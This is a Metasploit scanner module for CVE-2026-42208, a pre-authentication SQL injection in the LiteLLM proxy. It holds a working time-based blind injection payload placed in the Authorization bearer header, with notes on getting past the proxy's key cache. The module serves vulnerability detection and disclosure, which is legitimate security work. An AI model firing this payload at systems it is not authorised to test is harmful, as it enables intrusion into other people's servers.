##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'BerriAI LiteLLM Proxy Pre-Auth SQL Injection Scanner',
        'Description' => %q{
          This module detects BerriAI LiteLLM proxy servers affected by
          CVE-2026-42208, an unauthenticated SQL injection. During API-key
          verification the proxy interpolates the raw Authorization bearer value
          into a PostgreSQL query (WHERE v.token = '<token>') without
          parameterization. Because LiteLLM only hashes tokens that begin with
          "sk-", a bearer value that does not start with "sk-" reaches the query
          verbatim and is injectable. The failure path that performs the lookup is
          reachable before authentication. Affected versions are 1.81.16 through
          1.83.6 (fixed in 1.83.7).

          The module confirms the flaw with a benign time-based check built on the
          framework's PostgreSQL time-based blind SQL injection library. It issues a
          request whose injected predicate sleeps only when a tautology is true and a
          second request whose predicate never sleeps, and reports the target
          vulnerable only when the first is delayed while the second returns promptly.
          A server that is merely slow delays both requests and is not flagged. The
          module does not read or exfiltrate data.

          Detection requires the target to have provisioned at least one virtual
          key. The injected predicate is evaluated while looking up stored keys;
          an empty token table can avoid evaluating pg_sleep and produce no
          timing signal.
        },
        'Author' => [
          'Tencent YunDing Security Lab', # vulnerability discovery
          'Kenneth LaCroix' # Metasploit module
        ],
        'References' => [
          ['CVE', '2026-42208'],
          ['GHSA', 'r75f-5x8p-qvmc'],
          ['URL', 'https://bishopfox.com/blog/cve-2026-42208-pre-authentication-sql-injection-in-litellm-proxy']
        ],
        'DisclosureDate' => '2026-04-20',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DefaultOptions' => { 'RPORT' => 4000, 'SSL' => false }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The LiteLLM chat completions endpoint', '/v1/chat/completions']),
        OptString.new('MODEL', [true, 'Model name placed in the request body (need not be a real model)', 'gpt-3.5-turbo'])
      ]
    )

    # Msf::Exploit::SQLi registers SqliDelay with a 1.0s default. A single second
    # is easily lost in network jitter for a remote time-based check, so raise the
    # default to give a clearer signal while still letting the user tune it.
    register_advanced_options(
      [
        OptFloat.new('SqliDelay', [false, 'Seconds to pg_sleep for the time-based check', 5.0])
      ]
    )
  end

  # Best-effort fingerprint via the unauthenticated /health endpoint.
  def fingerprint
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('health'))
    return nil unless res

    key = res.headers.keys.find { |k| k.casecmp?('x-litellm-version') }
    return "LiteLLM #{res.headers[key]}" if key
    return 'LiteLLM /health' if res.code == 200

    nil
  end

  # The uncorrelated sleep subquery runs once when evaluated, even with multiple
  # token rows. Leave a margin for database and network overhead.
  def request_timeout
    (datastore['SqliDelay'] * 4 + 20).ceil
  end

  # Builds the time-based blind SQLi probe. The framework library hands our block
  # the boolean predicate to test; we break out of the WHERE v.token = '<token>'
  # string literal, OR in that predicate, and comment out the trailing quote. A
  # bearer that does not begin with "sk-" is interpolated verbatim, so the quote
  # reaches the query and the injection lands. The random suffix sits inside the
  # SQL comment (so it is inert) but makes every bearer unique, which defeats
  # LiteLLM's in-memory API-key auth cache: a repeated token would otherwise be
  # served from cache and skip the database, suppressing the pg_sleep.
  def create_litellm_sqli
    create_sqli(dbms: PostgreSQLi::TimeBasedBlind) do |payload|
      # Rex frames raw data by String#length, so send bytes for Unicode models.
      body = {
        'model' => datastore['MODEL'],
        'messages' => [{ 'role' => 'user', 'content' => 'x' }],
        'max_tokens' => 1
      }.to_json.b
      res = send_request_cgi(
        {
          'method' => 'POST',
          'uri' => normalize_uri(target_uri.path),
          'ctype' => 'application/json',
          'headers' => { 'Authorization' => "Bearer ' OR #{payload}-- #{Rex::Text.rand_text_alphanumeric(8)}" },
          'data' => body
        },
        request_timeout
      )
      raise Rex::ConnectionError.new(reason: 'No response to the SQL injection probe') unless res

      res
    end
  end

  def check_host(_ip)
    fp = fingerprint
    if create_litellm_sqli.test_vulnerable
      Exploit::CheckCode::Vulnerable("Time-based SQL injection via Authorization header confirmed#{fp ? " (#{fp})" : ''}")
    else
      Exploit::CheckCode::Safe('No time-based SQL injection signal observed')
    end
  rescue Rex::ConnectionError => e
    elog('Failed to complete the LiteLLM SQL injection check', error: e)
    Exploit::CheckCode::Unknown("Failed to complete the SQL injection check: #{e.message}")
  end

  def run_host(ip)
    code = check_host(ip)
    # HttpClient/Scanner use the base print_prefix, which does not add the peer.
    unless code == Exploit::CheckCode::Vulnerable
      print_status("#{peer} - #{code.message}") # rubocop:disable Lint/RedundantPeerInPrint
      return
    end

    print_good("#{peer} - #{code.message}") # rubocop:disable Lint/RedundantPeerInPrint
    report_vuln(
      host: rhost,
      port: rport,
      name: name,
      info: 'Time-based blind SQLi via Authorization header (pg_sleep)',
      refs: references
    )
  end
end
